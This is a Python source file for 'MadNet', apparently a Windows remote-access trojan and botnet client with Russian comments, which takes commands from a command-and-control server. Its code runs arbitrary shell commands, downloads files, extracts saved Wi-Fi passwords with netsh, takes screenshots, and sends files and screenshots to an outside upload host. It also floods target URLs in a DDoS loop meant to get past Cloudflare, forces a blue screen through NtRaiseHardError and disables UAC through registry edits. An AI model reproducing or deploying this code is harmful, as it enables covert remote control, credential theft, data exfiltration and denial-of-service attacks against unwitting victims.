
# -*- coding: utf8 -*-
import ctypes
from datetime import datetime
import os
import platform
import subprocess
import requests
import pyautogui
import keyboard
from cryptography.fernet import Fernet
from logger import Logger_Bot


VERSION = '2.0'
NAME_PROGRAM = 'MadNet'

media_path = 'media/'
config_file = "config.txt"

logger = Logger_Bot()

class Func_API:
    def __init__(self) -> None:
        self.pc = ''
        self.token = ''
        self.id_op = 0
        self.upd = 0
        self.uic = 0
        self.istd = ''
        self.ostd = ''
        self.url = 'http://192.168.1.175:9566' #'http//95.181.224.52:9566'

    def new_token(self):
        url = self.url + '/get/new'
        response = requests.post(url).json()
        print(response)
        if response['name']:
            self.pc = response['name']
            self.token = response['token']
            return True
        else:
            return False

    def send_answer(self, answer):
        data = {'token': self.token,
                'id': self.id_op,
                'answer': answer
                }
        requests.post(self.url + f"/push/{self.pc}", data=data)

    def save_config(self):
        data = f"{self.pc} {self.token} {self.upd} {self.uic}".encode()
        key = Fernet.generate_key()  # генер ключа шифрования
        f = Fernet(key)
        encrypted_text = key[:22] + f.encrypt(data) + key[-22:]

        with open(config_file, 'wb') as file:
            file.write(encrypted_text)

    def load_config(self):
        with open(config_file, 'rb') as file:
            data2 = file.read()
        key = data2[:22] + data2[-22:]  # чтение ключа
        f = Fernet(key)
        dec_text = f.decrypt(data2[22:-22]).decode().split()
        self.pc = dec_text[0]
        self.token = dec_text[1]
        self.upd = dec_text[2]
        self.uic = dec_text[3]

    def find_name(self, fig):
        lop = 0
        dir = os.listdir(media_path)
        for i in dir:
            if i[:3] == fig:
                lop += 1
        return fig + str(lop)

    def ren(self, path, content):
        vb = self.find_name(content)
        if content == "vid":
            os.rename(media_path + path, media_path + vb + ".mp4")
        elif content == "pic":
            os.rename(media_path + path, media_path + vb + ".png")
        return vb

    def cmdo_ret(self, com):  # нужно для работы ф-ции specifications
        try:
            res = subprocess.check_output(com, shell=True)
        except Exception as e:
            logger.log(self.cmdo_ret.__name__, e)
            return f'Ошибка: {e}'

        try:
            res = res.decode('utf8')
        except Exception as e:
            try:
                res = res.decode('cp866')
            except Exception as e:
                return f'Ошибка: {e}'
        return 'Успешно:\n' + res

    def cmdo(self, com):  # output от выполнения команды в cmd
        try:
            res = subprocess.check_output(com, shell=True)
        except Exception as e:
            logger.log(self.cmdo.__name__, e)
            self.send_answer(f'Ошибка: {e}')
        try:
            res = res.decode('utf8')
        except:
            try:
                res = res.decode('cp866')
            except Exception as e:
                logger.log(self.cmdo.__name__, e)
                self.send_answer(f'Ошибка: {e}')
        self.send_answer('Успешно:\n' + res)

    def cmdi(self, com):  # выполнение команды в cmd
        try:
            os.system(com)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.cmdi.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def exits(self):  # очищает папку с медиа
        dir = os.listdir(media_path)
        for i in dir:
            os.remove(media_path + i)
        self.send_answer("Успешно")

    def ip_address(self):
        try:
            # Получение IP-адреса через jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # Получение информации об IP-адресе через ip-api.com
            response = requests.get(
                url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # Создание словаря с информацией об IP-адресе
            data = {
                '[IP]': response.get('query'),
                '[Провайдер]': response.get('isp'),
                '[Организация]': response.get('org'),
                '[Страна]': response.get('country'),
                '[Регион]': response.get('regionName'),
                '[Город]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Широта]': response.get('lat'),
                '[Долгота]': response.get('lon'),
            }

            # Формирование строки с информацией об IP-адресе
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # Отправка строки с информацией об IP-адресе
            self.send_answer(info_string)
        except requests.exceptions.ConnectionError:
            logger.log(self.ip_address.__name__, 'Ошибка соединения')
            self.send_answer('Ошибка соединения')

    def wgt(self, com):
        try:
            data = requests.get(com[0])
            if data.status_code == 200:
                with open(com[1], 'wb') as f:
                    f.write(data.content)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.wgt.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def rebooting(self, timer):  # перезагрузка пк
        try:
            timer = "shutdown /r /t " + str(timer)
            os.system(timer)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.rebooting.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def shutdowning(self, timer):  # выключение пк
        try:
            timer = "shutdown /s /t " + str(timer)
            os.system(timer)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.shutdowning.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def picture(self, file):  # открытие картинки из папки с медиа
        try:
            command = f"{media_path}\\{file}.png"
            os.startfile(command)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.picture.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def video(self, file):  # открытие видео из папки с медиа
        try:
            command = f"{media_path}\\{file}.mp4"
            os.startfile(command)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.video.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def specifications(self):  # возвращает характеристики пк
        x, y = pyautogui.size()

        proc = os.popen(r'wmic cpu get name').read().split('\n')[2]
        fram = int(os.popen(r"wmic OS get FreePhysicalMemory").read().split(
            "\n")[2].strip()) // 1024
        ram = int(self.cmdo_ret(
            'powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[
            5].split(': ')[1][:-1]) // 1073741824
        vid = os.popen(
            r"wmic path win32_VideoController get name").read().split('\n')[2]
        banner = f"""Name PC:   {platform.node()}
System:       {platform.system()} {platform.release()}
CPU:          {proc}
GPU:          {vid}
RAM:          {ram} GB
fRAM          {fram} MB
Screen:       {x}x{y}"""
        self.send_answer(banner)

    def rask(self):  # меняет раскладку
        try:
            keyboard.press_and_release("alt+shift")
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.specifications.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def screenshot(self):  # скриншот и его отправка
        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
        pyautogui.screenshot(filename)
        
        self.send_document(filename)

        os.remove(filename)

    def keyb(self, text):  # печать текста
        try:
            text = text.split("+")
            listing = ""
            button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"]  # спец. клавиши
            for i in text:
                try:
                    index = button.index(i)
                    listing += i + "+"
                except Exception as e:
                    for kip in i:
                        listing += kip + "+"
            listing = listing[:-1].replace(' ', 'space')
            keyboard.press_and_release(listing)
            self.send_answer("Успешно")
        except Exception as e:
            logger.log(self.keyb.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def print_gui(self, text):  # создаёт окно с текстом
        try:
            pyautogui.alert(text, "~")
            self.send_answer('Успешно')
        except Exception as e:
            logger.log(self.print_gui.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def input_gui(self, text):  # создаёт окно с текстом и полем для ввода
        try:
            answer = pyautogui.prompt(text, "~")
            self.send_answer(answer)
        except Exception as e:
            logger.log(self.input_gui.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def closes(self):  # закрывает открытое сейчас приложение
        try:
            keyboard.press_and_release("alt+f4")
            self.send_answer('Успешно')
        except Exception as e:
            logger.log(self.closes.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def start_file(self, path):  # запускает файл по его path'у
        try:
            text = f"start " + path
            os.system(text)
            self.send_answer('Успешно')
        except Exception as e:
            logger.log(self.start_file.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def direct(self, paths):  # аналог команды tree с глубеной шага 1
        try:
            if paths == ".":
                paths = os.getcwd()
            exit_str = ""
            exit_str += f"{paths}: \n\n"
            current, dirs, files = os.walk(paths).__next__()
            for i in files:
                exit_str += i + "\n"
            for i in dirs:
                try:
                    o = os.listdir(paths + "/" + i)
                    exit_str += "|" + i + "\n"
                    for l in o:
                        exit_str += "| - " + l + "\n"
                    exit_str += "\n"
                except:
                    pass
            self.send_answer(exit_str)
        except Exception as e:
            logger.log(self.direct.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def update_bot(self):
        pass

    def ddos(self, url):
        # Устанавливаем headers Google бота, для обхода Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # Отправляем сообщение о начале DDOS атаки
            self.send_answer(f'DDOS атака на {url} успешно запущена')
        else:
            self.send_message(
                self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')

        while True:
            try:
                # Отправляем GET запрос с данными
                requests.get(url, headers=headers,
                             allow_redirects=True, stream=True)
            except:
                pass

    def pull_file(self, path: str):  # отправка файла с пк в тг
        path = path.replace('\\', '/')
        if os.path.exists(path):
            self.send_document(path)
        else:
            path = path.split('/')
            if len(path) <= 1:
                otv = f"Ошибка: файл не найден \n|{os.getcwd()}\n|--  " + \
                      '\n|--  '.join(os.listdir(os.getcwd()))
            else:
                pr = '/'.join(path[:-1])
                otv = f"Ошибка: файл не найден \n|{pr}\n|--  " + \
                      '\n|--  '.join(os.listdir(pr))
            self.send_answer(otv)

    def browser(self, link):  # открытие ссылки в браузере
        try:
            linke = 'start ' + link
            os.system(linke)
            self.send_answer('Успешно')
        except Exception as e:
            logger.log(self.browser.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def extract_wifi_passwords(self):  # камуниздинг паролей от wifi
        try:
            otv = ''
            profiles_data = subprocess.check_output(
                'netsh wlan show profiles').decode('utf-8').split('\n')
            profiles = [i.split(':')[1].strip()
                        for i in profiles_data if 'All User Profile' in i]

            for profile in profiles:

                profile_info = subprocess.check_output(
                    f'netsh wlan show profile {profile} key=clear')
                try:
                    profile_info = profile_info.decode('utf8').split('\n')
                except:
                    try:
                        profile_info = profile_info.decode('cp866').split('\n')
                    except Exception as e:
                        logger.log(self.extract_wifi_passwords.__name__, e)
                        self.send_answer(f'Ошибка: {e}')
                try:
                    password = [i.split(':')[1].strip()
                                for i in profile_info if 'Key Content' in i][0]
                except IndexError:
                    password = None
                otv += f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
            self.send_answer(f'Успешно\n{otv}')
        except Exception as e:
            logger.log(self.extract_wifi_passwords.__name__, e)
            self.send_answer(f'Ошибка: {e}')

    def tasklist(self, pid):
        if '.' == pid:
            try:

                prs = subprocess.Popen('tasklist', shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
                try:
                    pr_list = [prs[i].decode('cp866', 'ignore')
                               for i in range(3, len(prs))]
                except:
                    pr_list = [prs[i].decode('utf8', 'ignore')
                               for i in range(3, len(prs))]
                a = [[], []]
                out = 'Program | PID\n'
                for i in pr_list:

                    l = i.split()
                    if l[2] == 'Console':
                        if not l[0] in a[0]:
                            a[0].append(l[0])
                            a[1].append(l[1])

                for i in range(len(a[0])):
                    out += a[0][i].split('.exe')[0] + ' ' + a[1][i] + '\n'
                self.send_answer(out)

            except Exception as e:
                logger.log(self.tasklist.__name__, e)
                self.send_answer(f'Ошибка: {e}')
        else:
            lop = subprocess.Popen(f'taskkill /pid {pid}', shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()[0]
            try:
                self.send_answer(lop.decode('cp866'))
            except:
                self.send_answer(lop.decode('cp866'))

    def bsod(self):
        nullptr = ctypes.POINTER(ctypes.c_int)()

        ctypes.windll.ntdll.RtlAdjustPrivilege(
            ctypes.c_uint(19),
            ctypes.c_uint(1),
            ctypes.c_uint(0),
            ctypes.byref(ctypes.c_int())
        )

        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC000007B),
            ctypes.c_ulong(0),
            nullptr,
            nullptr,
            ctypes.c_uint(6),
            ctypes.byref(ctypes.c_uint())
        )

    def loggs(self, dat):
        namer = f'log_{dat}.txt'
        answer = logger.get_log(namer)
        try:
            if answer:
                
                self.send_document(answer)

                os.remove(answer)
        except Exception as e:
            logger.log(self.loggs.__name__, e)
            self.send_answer(f'Ошибка: {e}')
    
    def send_document(self, path):
        url = 'https://so.urceco.de/upload/' 
        data = {
            "Accept": "application/json",
            "Linx-Randomize": "yes",
            'Linx-Expiry': '604800'
        }
        file = open(path, 'rb').read()
        response = requests.put(url, headers=data, data=file).json()['url']

        self.send_answer(response)

    def hendler(self, arr):
        for i in arr:
            c = i[1].split(',') 
            self.id_op = i[0]
            comnd = c[0]
            text_comand = c[1:]  # преобразования

            if comnd == "wget":
                self.wgt(text_comand)

            if comnd == "ip" or comnd == "ipad":
                self.ip_address()

            if comnd == "reboot":
                self.rebooting(text_comand[0])

            if comnd == "specifications" or comnd == "spec":
                self.specifications()

            if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
                self.shutdowning(text_comand[0])

            if comnd == "picture" or comnd == "pict":
                self.picture(text_comand[0])

            if comnd == "cmdi":
                self.cmdi(text_comand[0])

            if comnd == "cmdo":
                self.cmdo(text_comand[0])

            if comnd == "video" or comnd == "vide" or comnd == "vid":
                self.video(text_comand[0])

            if comnd == "exit" or comnd == "cls" or comnd == "clear":
                self.exits()

            if comnd == "lock" or comnd == "close":
                self.closes()

            if comnd == "keyb" or comnd == "keyboard":
                self.keyb(text_comand[0])

            if comnd == "rask" or comnd == "layout":
                self.rask()

            if comnd == "dir" or comnd == "direction":
                self.direct(text_comand[0])

            if comnd == "log":
                self.loggs(text_comand[0])

            if comnd == "screenshot" or comnd == "scrn":
                self.screenshot()

            if comnd == "inpt" or comnd == "input":
                target = self.input_gui(text_comand[0])

            if comnd == "outp" or comnd == "output":
                self.print_gui(text_comand[0])

            if comnd == "start" or comnd == "strt":
                self.start_file(text_comand[0])

            if comnd == "ddos" or comnd == "attack_for":
                self.ddos(text_comand[0])

            if comnd == "browser" or comnd == "brws":
                self.browser(text_comand[0])

            if comnd == "pull" or comnd == "pull_file":
                self.pull_file(text_comand[0])

            if comnd == "wifi" or comnd == "extract_wifi_passwords":
                self.extract_wifi_passwords()

            if comnd == "tasklist" or comnd == "task":
                self.tasklist(text_comand[0])

            if comnd == "bsod":
                self.bsod()

            if comnd == "kill":
                self.exits()

            if comnd == "upd":
                self.update_bot()

    def fprint(self):
        print(f"{self.pc} {self.token} {self.upd} {self.uic}")

    def send_online(self, text):
        data = {'token': self.token,
                'id': self.id_op,
                'answer': text
                }
        requests.post(self.url + f"/online/{self.pc}", data=data)

    def online(self):

        if ctypes.windll.shell32.IsUserAnAdmin():
            self.send_online(f'{self.NAME_PC} запущен от имени администратора')

            if not self.uic:  # Отрубает UAC
                try:
                    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
                    subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
                    subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                    self.uic = '1'
                    self.save_config()

                except Exception as e:
                    logger.log("disable_UAC", e)
                        
                    self.send_online( f'Ошибка: {e}')

        else:
            self.send_online( f'{self.pc} запущен от имени обычного пользователя')
    

# fapi = Func_API()
# # fapi.new_token()
# # fapi.pc = 'pc0'
# # fapi.token = 'qhh53cm5qdz6'
# fapi.load_config()
# fapi.fprint()
# fapi.online()
# # fapi.hendler([['5','cmdo,dir'], ['5','wget,https://raw.githubusercontent.com/DmodvGH/MadNet/main/main.py,lol.py'], ['5','scrn']])